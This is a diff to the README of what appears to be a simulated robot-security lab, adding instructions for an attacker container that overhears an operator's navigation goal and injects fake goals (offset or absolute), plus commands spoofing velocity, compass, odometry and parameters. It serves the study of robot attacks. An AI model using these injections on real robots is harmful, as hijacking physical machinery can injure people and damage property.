@@ -60,34 +60,60 @@ the origin and move_base is ready.
 
 ---
 
-## Terminal 3 — attacker lurks (START BEFORE THE OPERATOR)
+The attacker always starts BEFORE the operator and waits: it overhears the
+operator's one-shot goal the instant the operator publishes it. There are two ways
+to run it — **see-then-decide** (watch the goal first, then attack) or **direct
+attack** (values chosen up front).
 
+### Option 1 — See-then-decide (`--watch`, then attack)
+
+**STEP 1 — watch:** overhear the operator's real goal, PRINT it, and exit —
+injects nothing.
+
+Terminal 3 (attacker):
 ```bash
 cd ~/Documents/Husky_viz/attacker
 export ROBOT_HOST_IP=172.20.0.1
-docker compose run --rm attacker ./attacker/attack.sh goal --offset-y 12
+docker compose run --rm attacker ./attacker/attack.sh goal --watch
 ```
+Terminal 4 (operator) — send a goal so the attacker can see it:
+```bash
+cd ~/Documents/Husky_viz/operator
+export ROBOT_HOST_IP=172.20.0.1
+docker compose run --rm operator ./operator/operate.py --goal-x 7 --goal-y 0
+```
+Terminal 3 prints and exits:
+```
+OVERHEARD operator goal: (7.00, 0.00)
+WATCH: operator's real goal is (7.0000, 0.0000). No injection (--watch)...
+```
+Now you KNOW the real goal is (7, 0). Nothing was attacked — the robot just goes
+to (7, 0) normally. Decide your fake target, then do STEP 2.
 
-Wait for:
-`Subscription connected (...). READY — now waiting for the operator's goal.`
+**STEP 2 — attack:** re-run WITHOUT `--watch`, with your chosen target (see the two
+modes below). The operator must send its goal again so the attacker overhears it and
+injects.
 
-**Two target modes (`--mode`, default `offset`):**
+### Option 2 — Direct attack (target chosen up front)
 
-- **Offset** (`--mode offset`, the default) — fake goal = operator's real goal + offset:
+Terminal 3 (attacker) — pick ONE mode, then wait for
+`READY — now waiting for the operator's goal.`:
+
+- **Offset** — fake goal = operator's real goal + offset:
   ```bash
   docker compose run --rm attacker ./attacker/attack.sh goal --mode offset --offset-y 12
   docker compose run --rm attacker ./attacker/attack.sh goal --offset-y 3   # subtle (mode defaults to offset)
   ```
   `--offset-y 12` = obvious hijack; `--offset-y 3` = subtle drift. Flags: `--offset-x`, `--offset-y` (default 0, 12).
 
-- **Absolute** (`--mode abs`) — fake goal = a fixed target you choose, ignoring the real goal:
+- **Absolute** — fake goal = a fixed target you choose, ignoring the real goal:
   ```bash
   docker compose run --rm attacker ./attacker/attack.sh goal --mode abs --abs-x 10 --abs-y 12
   ```
   Flags: `--abs-x`, `--abs-y`. (The attacker still overhears the real goal first — the
-  `OVERHEARD` recon line still shows — it just sends your absolute target instead.)
+  `OVERHEARD` line still shows — it just sends your target instead.)
 
-Either mode: other flags `--rate` (default 2 Hz), `--duration` (0 = until Ctrl-C),
+Any invocation: other flags `--rate` (default 2 Hz), `--duration` (0 = until Ctrl-C),
 `--timeout` (default 60 s to wait for the operator's goal), `--csv <path>`
 (default `attack_goal_report.csv`).
 
@@ -105,13 +131,14 @@ The operator sends the robot to `(10, 0)`.
 
 ---
 
-## What you should see
+## What you should see (attack run)
 
-**Terminal 3 (attacker):**
+**Terminal 3 (attacker), e.g. `--mode abs --abs-x 10 --abs-y 12`:**
 ```
 OVERHEARD operator goal: (10.00, 0.00)
-INJECTING fake goal: real=(10.00,0.00) + offset=(0.00,12.00) -> fake=(10.00,12.00)
+INJECTING absolute fake goal: (10.00,12.00) (real was (10.00,0.00))
 ```
+(In offset mode the second line reads `INJECTING fake goal: real=(10,0) + offset=... -> fake=(10,12)`.)
 
 **Gazebo:** the robot drives diagonally toward **(10, 12)** — NOT the `(10, 0)` the
 operator sent.
@@ -121,6 +148,14 @@ operator sent.
   `robot_x/robot_y` climbing toward the fake goal.
 - `operator_run.csv` — `ref=(10,0)`: the operator *believed* it sent the robot to
   (10,0). **Operator intent ≠ robot path = the hijack.**
+
+## Normal run (no attack)
+
+Just the operator, no attacker running → the robot goes where it was told:
+```bash
+docker compose run --rm operator ./operator/operate.py --goal-x 10 --goal-y 0
+# robot drives to (10, 0). operator_run.csv fused_x/y reach ~(10,0).
+```
 
 ---
 
@@ -151,7 +186,9 @@ docker compose run --rm attacker ./attacker/attack.sh cmd_vel  --duration 8
 docker compose run --rm attacker ./attacker/attack.sh compass  --yaw 1.5708
 docker compose run --rm attacker ./attacker/attack.sh odom
 docker compose run --rm attacker ./attacker/attack.sh param
-docker compose run --rm attacker ./attacker/attack.sh goal     --offset-y 12
+docker compose run --rm attacker ./attacker/attack.sh goal     --mode offset --offset-y 12
+docker compose run --rm attacker ./attacker/attack.sh goal     --watch          # just see the goal
+docker compose run --rm attacker ./attacker/attack.sh goal     --mode abs --abs-x 10 --abs-y 12
 ```
 
 ---
